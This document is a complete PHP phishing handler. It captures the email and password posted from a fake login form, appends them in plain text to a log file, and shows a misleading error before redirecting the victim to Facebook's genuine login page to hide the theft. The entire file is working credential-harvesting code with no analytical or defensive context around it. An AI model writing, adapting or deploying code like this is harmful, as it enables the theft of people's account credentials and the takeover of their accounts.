<?php
$passwd = $_POST["pass"];
$account = $_POST["email"];
$data = fopen("logfile.txt","a+");
fwrite($data, "Username: $account\nPassword: $passwd\n");
fclose($data);
?>
<html>
<meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php">
<body>
Something goes wrong.Redirecting.......
</body>
</html>